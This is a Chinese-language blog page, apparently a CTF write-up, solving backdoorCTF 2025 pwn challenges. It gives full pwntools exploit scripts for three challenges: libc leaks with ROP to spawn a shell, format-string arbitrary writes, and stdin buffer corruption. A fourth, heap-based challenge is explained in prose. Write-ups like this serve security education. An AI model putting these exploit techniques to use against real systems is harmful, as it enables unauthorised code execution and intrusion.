<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>backdoorCTF2025 PWN Writeup | Wgg's Blog Site</title>
<meta name=keywords content><meta name=description content='backdoorCTF 2025 PWN Writeup
Devil&rsquo;s Convergence
很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址
还存在栈溢出漏洞，直接写ROP拿shell即可
exp
#!/usr/bin/env python3
from pwn import *
from pwncli import *
context(os=&#39;linux&#39;,arch = &#39;amd64&#39;)
#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]
filename = "chal_chainsawman" + "_patched"
libcname = "/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "remote.infoseciitr.in"
port = 8005
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = &#39;&#39;&#39;
set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
&#39;&#39;&#39;

def sa(a,b):
    sh.sendafter(a, b)

def sla(a, b):
    sh.sendlineafter(a, b)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)

def cyclic_xor(data: bytes, key: bytes) -> bytes:
    """
    对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。

    Args:
        data: 需要进行异或操作的输入字节串。
        key: 8 字节的密钥。

    Returns:
        异或操作后的结果字节串。

    Raises:
        ValueError: 如果密钥长度不是 8 字节，则抛出异常。
    """
    # 检查密钥长度是否为 8 字节
    if len(key) != 8:
        raise ValueError("密钥 (key) 必须是 8 字节长。")

    # 用于存储结果的字节列表
    result_list = []
    
    # 获取数据和密钥的长度
    data_len = len(data)
    key_len = len(key)  # key_len 此时应为 8

    # 遍历数据中的每个字节
    for i in range(data_len):
        # 确定当前字节 i 对应的密钥字节的索引 j
        # j = i % key_len 会让 j 在 0 到 7 之间循环
        j = i % key_len
        
        # 对数据字节和密钥字节进行 XOR 运算
        # data[i] 和 key[j] 都是整数（0-255）表示的字节值
        xor_byte = data[i] ^ key[j]
        
        # 将 XOR 结果添加到结果列表中
        result_list.append(xor_byte)

    # 将整数列表转换回字节串并返回
    return bytes(result_list)

sh = start()
# 自定义 dest 内容
sa("Submit to her control: ", b&#39;\x00&#39; * 4)
sh.recvuntil(b"essence: ")
low4 = sh.recv(4)
sa("to War: ", b&#39;\x00&#39; * 4)
sh.recvuntil(b"essence: ")
high4 = sh.recv(4)
system_addr = u64(low4 + high4)
log.success("system: " + hex(system_addr))
libc_base = system_addr - libc.sym[&#39;system&#39;]
rdi_ret = 0x000000000010f78b + libc_base
binsh_addr = libc_base + next(libc.search("/bin/sh"))
payload = b&#39;A&#39; * 80 + b&#39;B&#39; * 8 + p64(rdi_ret + 1) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)
sa("contract: ", cyclic_xor(payload, p64(system_addr)))

sh.interactive()
Gamble
存在可多次触发的格式化字符串漏洞，printf里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放%9$hhn来往任意地址写入b&#39;\x00。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。'><meta name=author content="Me"><link rel=canonical href=https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/"><meta property="og:site_name" content="Wgg's Blog Site"><meta property="og:title" content="backdoorCTF2025 PWN Writeup"><meta property="og:description" content='backdoorCTF 2025 PWN Writeup Devil’s Convergence 很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址
还存在栈溢出漏洞，直接写ROP拿shell即可
exp
#!/usr/bin/env python3 from pwn import * from pwncli import * context(os=&#39;linux&#39;,arch = &#39;amd64&#39;) #context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ] filename = "chal_chainsawman" + "_patched" libcname = "/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6" host = "remote.infoseciitr.in" port = 8005 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = &#39;&#39;&#39; set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 &#39;&#39;&#39; def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def cyclic_xor(data: bytes, key: bytes) -> bytes: """ 对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。 Args: data: 需要进行异或操作的输入字节串。 key: 8 字节的密钥。 Returns: 异或操作后的结果字节串。 Raises: ValueError: 如果密钥长度不是 8 字节，则抛出异常。 """ # 检查密钥长度是否为 8 字节 if len(key) != 8: raise ValueError("密钥 (key) 必须是 8 字节长。") # 用于存储结果的字节列表 result_list = [] # 获取数据和密钥的长度 data_len = len(data) key_len = len(key) # key_len 此时应为 8 # 遍历数据中的每个字节 for i in range(data_len): # 确定当前字节 i 对应的密钥字节的索引 j # j = i % key_len 会让 j 在 0 到 7 之间循环 j = i % key_len # 对数据字节和密钥字节进行 XOR 运算 # data[i] 和 key[j] 都是整数（0-255）表示的字节值 xor_byte = data[i] ^ key[j] # 将 XOR 结果添加到结果列表中 result_list.append(xor_byte) # 将整数列表转换回字节串并返回 return bytes(result_list) sh = start() # 自定义 dest 内容 sa("Submit to her control: ", b&#39;\x00&#39; * 4) sh.recvuntil(b"essence: ") low4 = sh.recv(4) sa("to War: ", b&#39;\x00&#39; * 4) sh.recvuntil(b"essence: ") high4 = sh.recv(4) system_addr = u64(low4 + high4) log.success("system: " + hex(system_addr)) libc_base = system_addr - libc.sym[&#39;system&#39;] rdi_ret = 0x000000000010f78b + libc_base binsh_addr = libc_base + next(libc.search("/bin/sh")) payload = b&#39;A&#39; * 80 + b&#39;B&#39; * 8 + p64(rdi_ret + 1) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) sa("contract: ", cyclic_xor(payload, p64(system_addr))) sh.interactive() Gamble 存在可多次触发的格式化字符串漏洞，printf里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放%9$hhn来往任意地址写入b&#39;\x00。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-08T23:30:24+08:00"><meta property="article:modified_time" content="2025-12-08T23:30:24+08:00"><meta property="og:image" content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="backdoorCTF2025 PWN Writeup"><meta name=twitter:description content='backdoorCTF 2025 PWN Writeup
Devil&rsquo;s Convergence
很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址
还存在栈溢出漏洞，直接写ROP拿shell即可
exp
#!/usr/bin/env python3
from pwn import *
from pwncli import *
context(os=&#39;linux&#39;,arch = &#39;amd64&#39;)
#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]
filename = "chal_chainsawman" + "_patched"
libcname = "/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "remote.infoseciitr.in"
port = 8005
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = &#39;&#39;&#39;
set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
&#39;&#39;&#39;

def sa(a,b):
    sh.sendafter(a, b)

def sla(a, b):
    sh.sendlineafter(a, b)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)

def cyclic_xor(data: bytes, key: bytes) -> bytes:
    """
    对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。

    Args:
        data: 需要进行异或操作的输入字节串。
        key: 8 字节的密钥。

    Returns:
        异或操作后的结果字节串。

    Raises:
        ValueError: 如果密钥长度不是 8 字节，则抛出异常。
    """
    # 检查密钥长度是否为 8 字节
    if len(key) != 8:
        raise ValueError("密钥 (key) 必须是 8 字节长。")

    # 用于存储结果的字节列表
    result_list = []
    
    # 获取数据和密钥的长度
    data_len = len(data)
    key_len = len(key)  # key_len 此时应为 8

    # 遍历数据中的每个字节
    for i in range(data_len):
        # 确定当前字节 i 对应的密钥字节的索引 j
        # j = i % key_len 会让 j 在 0 到 7 之间循环
        j = i % key_len
        
        # 对数据字节和密钥字节进行 XOR 运算
        # data[i] 和 key[j] 都是整数（0-255）表示的字节值
        xor_byte = data[i] ^ key[j]
        
        # 将 XOR 结果添加到结果列表中
        result_list.append(xor_byte)

    # 将整数列表转换回字节串并返回
    return bytes(result_list)

sh = start()
# 自定义 dest 内容
sa("Submit to her control: ", b&#39;\x00&#39; * 4)
sh.recvuntil(b"essence: ")
low4 = sh.recv(4)
sa("to War: ", b&#39;\x00&#39; * 4)
sh.recvuntil(b"essence: ")
high4 = sh.recv(4)
system_addr = u64(low4 + high4)
log.success("system: " + hex(system_addr))
libc_base = system_addr - libc.sym[&#39;system&#39;]
rdi_ret = 0x000000000010f78b + libc_base
binsh_addr = libc_base + next(libc.search("/bin/sh"))
payload = b&#39;A&#39; * 80 + b&#39;B&#39; * 8 + p64(rdi_ret + 1) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr)
sa("contract: ", cyclic_xor(payload, p64(system_addr)))

sh.interactive()
Gamble
存在可多次触发的格式化字符串漏洞，printf里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放%9$hhn来往任意地址写入b&#39;\x00。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wgggggggg.github.io/posts/"},{"@type":"ListItem","position":2,"name":"backdoorCTF2025 PWN Writeup","item":"https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"backdoorCTF2025 PWN Writeup","name":"backdoorCTF2025 PWN Writeup","description":"backdoorCTF 2025 PWN Writeup Devil\u0026rsquo;s Convergence 很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址\n还存在栈溢出漏洞，直接写ROP拿shell即可\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os=\u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;) #context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;new-window\u0026#39;, \u0026#39;-n\u0026#39;, \u0026#39;debug\u0026#39; ] filename = \u0026#34;chal_chainsawman\u0026#34; + \u0026#34;_patched\u0026#34; libcname = \u0026#34;/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; host = \u0026#34;remote.infoseciitr.in\u0026#34; port = 8005 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = \u0026#39;\u0026#39;\u0026#39; set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 \u0026#39;\u0026#39;\u0026#39; def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def cyclic_xor(data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34; 对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。 Args: data: 需要进行异或操作的输入字节串。 key: 8 字节的密钥。 Returns: 异或操作后的结果字节串。 Raises: ValueError: 如果密钥长度不是 8 字节，则抛出异常。 \u0026#34;\u0026#34;\u0026#34; # 检查密钥长度是否为 8 字节 if len(key) != 8: raise ValueError(\u0026#34;密钥 (key) 必须是 8 字节长。\u0026#34;) # 用于存储结果的字节列表 result_list = [] # 获取数据和密钥的长度 data_len = len(data) key_len = len(key) # key_len 此时应为 8 # 遍历数据中的每个字节 for i in range(data_len): # 确定当前字节 i 对应的密钥字节的索引 j # j = i % key_len 会让 j 在 0 到 7 之间循环 j = i % key_len # 对数据字节和密钥字节进行 XOR 运算 # data[i] 和 key[j] 都是整数（0-255）表示的字节值 xor_byte = data[i] ^ key[j] # 将 XOR 结果添加到结果列表中 result_list.append(xor_byte) # 将整数列表转换回字节串并返回 return bytes(result_list) sh = start() # 自定义 dest 内容 sa(\u0026#34;Submit to her control: \u0026#34;, b\u0026#39;\\x00\u0026#39; * 4) sh.recvuntil(b\u0026#34;essence: \u0026#34;) low4 = sh.recv(4) sa(\u0026#34;to War: \u0026#34;, b\u0026#39;\\x00\u0026#39; * 4) sh.recvuntil(b\u0026#34;essence: \u0026#34;) high4 = sh.recv(4) system_addr = u64(low4 + high4) log.success(\u0026#34;system: \u0026#34; + hex(system_addr)) libc_base = system_addr - libc.sym[\u0026#39;system\u0026#39;] rdi_ret = 0x000000000010f78b + libc_base binsh_addr = libc_base + next(libc.search(\u0026#34;/bin/sh\u0026#34;)) payload = b\u0026#39;A\u0026#39; * 80 + b\u0026#39;B\u0026#39; * 8 + p64(rdi_ret + 1) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) sa(\u0026#34;contract: \u0026#34;, cyclic_xor(payload, p64(system_addr))) sh.interactive() Gamble 存在可多次触发的格式化字符串漏洞，printf里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放%9$hhn来往任意地址写入b'\\x00。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。\n","keywords":[],"articleBody":"backdoorCTF 2025 PWN Writeup Devil’s Convergence 很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址\n还存在栈溢出漏洞，直接写ROP拿shell即可\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"chal_chainsawman\" + \"_patched\" libcname = \"/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6\" host = \"remote.infoseciitr.in\" port = 8005 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 ''' def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def cyclic_xor(data: bytes, key: bytes) -\u003e bytes: \"\"\" 对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。 Args: data: 需要进行异或操作的输入字节串。 key: 8 字节的密钥。 Returns: 异或操作后的结果字节串。 Raises: ValueError: 如果密钥长度不是 8 字节，则抛出异常。 \"\"\" # 检查密钥长度是否为 8 字节 if len(key) != 8: raise ValueError(\"密钥 (key) 必须是 8 字节长。\") # 用于存储结果的字节列表 result_list = [] # 获取数据和密钥的长度 data_len = len(data) key_len = len(key) # key_len 此时应为 8 # 遍历数据中的每个字节 for i in range(data_len): # 确定当前字节 i 对应的密钥字节的索引 j # j = i % key_len 会让 j 在 0 到 7 之间循环 j = i % key_len # 对数据字节和密钥字节进行 XOR 运算 # data[i] 和 key[j] 都是整数（0-255）表示的字节值 xor_byte = data[i] ^ key[j] # 将 XOR 结果添加到结果列表中 result_list.append(xor_byte) # 将整数列表转换回字节串并返回 return bytes(result_list) sh = start() # 自定义 dest 内容 sa(\"Submit to her control: \", b'\\x00' * 4) sh.recvuntil(b\"essence: \") low4 = sh.recv(4) sa(\"to War: \", b'\\x00' * 4) sh.recvuntil(b\"essence: \") high4 = sh.recv(4) system_addr = u64(low4 + high4) log.success(\"system: \" + hex(system_addr)) libc_base = system_addr - libc.sym['system'] rdi_ret = 0x000000000010f78b + libc_base binsh_addr = libc_base + next(libc.search(\"/bin/sh\")) payload = b'A' * 80 + b'B' * 8 + p64(rdi_ret + 1) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) sa(\"contract: \", cyclic_xor(payload, p64(system_addr))) sh.interactive() Gamble 存在可多次触发的格式化字符串漏洞，printf里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放%9$hhn来往任意地址写入b'\\x00。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。\n既然有任意地址写b'\\x00'那么就可以想到，写stdin的_IO_buf_base的最低字节，由此实现任意地址写。\n值得注意的是，利用这种办法任意地址写时，最好把第二次覆盖stdin的ptr和end写“宽”一点，比如payload = b'a' * 0x18 + p64(targetaddr - 0x8) + p64(targetaddr + 0x20) + p64(0) * 4，否则会在写入已经想要的东西后，还没ret，但是再次触发写入覆盖\n程序还有一个win函数，会输出flag，在栈上把返回地址写为win函数地址即可。\n感觉这题这种解法不是预期解，等一下官方的WriteUp\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux', arch='amd64') # context.terminal = ['tmux', 'new-window', '-n', 'debug'] filename = \"chal\" libcname = \"/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6\" host = \"remote.infoseciitr.in\" port = 8004 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 ''' def sa(a, b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) # ============================= 漏洞利用函数 ============================= def vuln1_integer_overflow_login(user_id, username, target_balance): \"\"\" 漏洞 #1: 整数溢出 - 在 login 函数中控制余额 原理: - login 函数计算: balance += 8 * user_input - 通过精心选择 user_input，可以让余额变成任意值 - 甚至可以设置为负数或特定地址 利用: - 设置余额为任意值（包括地址，用于后续任意写零） - 输入负数可以减少余额 - 输入超大值可能导致溢出 Args: user_id: 用户 ID (0-9) username: 用户名 target_balance: 目标余额（将会乘以8后加到余额上） 返回: 实际设置的余额 = target_balance * 8 \"\"\" log.info(f\"[VULN #1] Integer Overflow: Setting user {user_id} balance to {hex(target_balance * 8)}\") # 选择菜单选项 [1] Login sla(b\"\u003e \", b\"1\") # 输入用户 ID sla(b\"Enter your user ID (0-9): \", str(user_id).encode()) # 首次登录，输入用户名 sla(b\"Please enter your name: \", username) # 输入金额（将会乘以 8） # 注意：如果 target_balance 是负数或很大，会触发整数溢出 sla(b\"Enter amount of coins you want: \", str(target_balance).encode()) actual_balance = target_balance * 8 log.success(f\"User {user_id} balance set to: {hex(actual_balance) if actual_balance \u003e= 0 else actual_balance}\") return actual_balance def vuln2_format_string_leak(user_id, fmt_payload): \"\"\" 漏洞 #2: 格式化字符串 - 在 bet 函数中泄露栈/libc/PIE地址 原理: - bet 函数允许输入 16 字节，但 buffer 只有 10 字节 - 字节 10-15 会溢出覆盖 format 变量 - 随后 printf(format) 将用户控制的格式字符串执行 利用: - 泄露栈地址: %p 或 %$p - 泄露 libc: %$s (需要知道栈上有 libc 指针) - 任意地址读: 构造特殊 payload Args: user_id: 用户 ID (0-9) offset: 格式化字符串偏移 (用于 %$p) 返回: 泄露的地址 (8 字节) \"\"\" # 选择菜单选项 [2] Place Bet sla(b\"\u003e \", b\"2\") # 输入用户 ID sla(b\"Plese enter id to place bet: \", str(user_id).encode()) # 发送 payload（注意：不要发送换行符，用 send 而不是 sendline） #sh.interactive() sh.sendlineafter(b\"Enter your bet amount (Please specify Currency): \", fmt_payload) # 接收格式化字符串输出 leaked = sh.recvline().strip() log.info(f\"Format string output: {leaked}\") # 解析地址 if leaked.startswith(b\"0x\"): leaked_addr = int(leaked[:14], 16) return leaked_addr else: log.warning(f\"Failed to parse leaked address: {leaked}\") return None sh = start() log.info(\"\\n\" + \"=\"*60) log.info(\"DEMO 2: Format String Vulnerability - Leak Addresses\") log.info(\"=\"*60) vuln1_integer_overflow_login(1, b\"pwner\", 1000) vuln1_integer_overflow_login(2, b\"pwner\", 1000) vuln1_integer_overflow_login(4, b\"pwner\", 1000) vuln1_integer_overflow_login(5, b\"pwner\", 1000) leaked = vuln2_format_string_leak(2, b'A' * 10 + b'%33$p') libc_base = leaked - 0x2a1ca _IO_2_1_stdin_ = libc_base + 0x2038e0 leaked = vuln2_format_string_leak(4, b'A' * 10 + b'%28$p') print(leaked) targetaddr = leaked - 0x18 leaked = vuln2_format_string_leak(1, b'A' * 10 + b'%29$p') pie = leaked - 0x1ec7 leaked = vuln2_format_string_leak(5, b'A' * 2 + p64(_IO_2_1_stdin_ + 0x38) + b'%9$hhn') sla(\"\u003e \", str(1)) sla(\"ID (0-9): \", str(9)) payload = b'a' * 0x18 + p64(targetaddr - 0x8) + p64(targetaddr + 0x20) + p64(0) * 4 sla(\"name: \", payload) sla(\"\u003e \", str(1)) sla(\"ID (0-9): \", str(8)) win_addr = p64(targetaddr + 0x100) + p64(pie + 0x16F1) print(targetaddr) sla(\"name: \", win_addr) sla(\"want: \", str(10)) sh.interactive() Aladdin ka Chirag 格式化字符串漏洞\n虽然printf里看似参数只能塞大小为8的buf，但是注意到s在buf的高地址处，并且buf读入后没有补\\x00，所以其实printf的参数可以塞大小为16的buf\n仔细看11行的read，会发现还有一个栈溢出，溢出0xa字节，可以把rbp覆盖，再覆盖返回地址的一部分，可以选择覆盖最低字节到\n这样可以无限触发格式化字符串漏洞，并且有16字节的空间，可以实现任意写。\n将栈上的libc_start_main_ret写一串ROP开shell即可。\nQ：栈溢出为什么要写返回地址到call cave而不是main或者cave的起始地址？\nA：因为修改到main或cave，堆栈就不平衡了，之后不会返回到libc_start_main_ret，当然应该还有其他解法，不一定要ROP，只是我更喜欢这种\nexp\n#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = \"chall\" + \"_patched\" libcname = \"/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6\" host = \"remote.infoseciitr.in\" port = 8007 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) #b *$rebase(0x13AA) gs = ''' b *$rebase(0x138B) set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 ''' def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def format_write(addr, byte): payload = b'%8$hhnAA' + p64(addr) + b'\\xcd' sa(\"Enter your name \u003e\u003e \", payload) format_payload = bytes(b'A' * (6 - len(str(abs(byte)))) + bytes(f'%{byte - (6 - len(str(abs(byte))))}c', encoding='ASCII')) sa(\"Enter your wish \u003e\u003e \", format_payload) def format_write_addr(target_addr, write_addr): for i in range(6): format_write(target_addr + i, (write_addr \u003e\u003e (8 * i)) \u0026 0xff) sh = start() # Your exploit here payload = b'A' * 16 + b'\\xcd' sa(\"Enter your name \u003e\u003e \", payload) format_payload = b'%9$p' # 10 #11 sa(\"Enter your wish \u003e\u003e \", format_payload) pie = int(sh.recv(14), base = 16) - 0x13cd log.success(\"pie:\" + hex(pie)) payload = b'A' * 16 + b'\\xcd' sa(\"Enter your name \u003e\u003e \", payload) format_payload = b'%11$p' # 10 #11 sa(\"Enter your wish \u003e\u003e \", format_payload) libc_base = int(sh.recv(14), base = 16)-0x2a1ca log.success(\"stack:\" + hex(libc_base)) payload = b'A' * 16 + b'\\xcd' sa(\"Enter your name \u003e\u003e \", payload) format_payload = b'%10$p' # 10 #11 sa(\"Enter your wish \u003e\u003e \", format_payload) stack = int(sh.recv(14), base = 16) log.success(\"stack:\" + hex(stack)) libc_start_main_ret_stack = stack - 0x98 rdi_ret = 0x000000000010f78b + libc_base format_write_addr(libc_start_main_ret_stack, rdi_ret) format_write_addr(libc_start_main_ret_stack + 0x8, libc_base + next(libc.search(\"/bin/sh\"))) format_write_addr(libc_start_main_ret_stack + 0x10, rdi_ret + 1) format_write_addr(libc_start_main_ret_stack + 0x18, libc_base + libc.sym['system']) sla(\"Enter your name \u003e\u003e \", str(123)) sla(\"Enter your wish \u003e\u003e \", str(123)) sh.interactive() Santa’s Workshop 堆题，libc2.35\n第9行，会泄露heapbase，感觉没必要给，可以通过large_bin泄露\n不截图每个函数了，大致说一下有哪些功能和漏洞\n非常完备，有malloc，free，show，edit，edit存在溢出一个\\x00的漏洞\n再关注一下case 5和case 6\n简单来说就是，load_secret会分配一个堆块，往里面写上随机的secret，然后可以调用master_key，检查你的输入，与secret对比，相同就给你flag\n所以这道题要做的就是利用溢出一个\\x00的漏洞去泄露一个堆块的内容\n第一反应是经典的off-by-one\nhttps://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/\n但是libc2.29加入了保护\nif (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); 所以这种办法行不通\n想一想这种经典办法为什么会被这个保护拦截，因为他是控制presize，使得prev_chunk是一个真实的被free了的chunk（里面还隔几个chunk，从而造成重叠），为什么要这样做呢？\n因为在unlink的时候会检查\nif (__builtin_expect (fd-\u003ebk != p || bk-\u003efd != p, 0)) malloc_printerr (\"corrupted double-linked list\"); 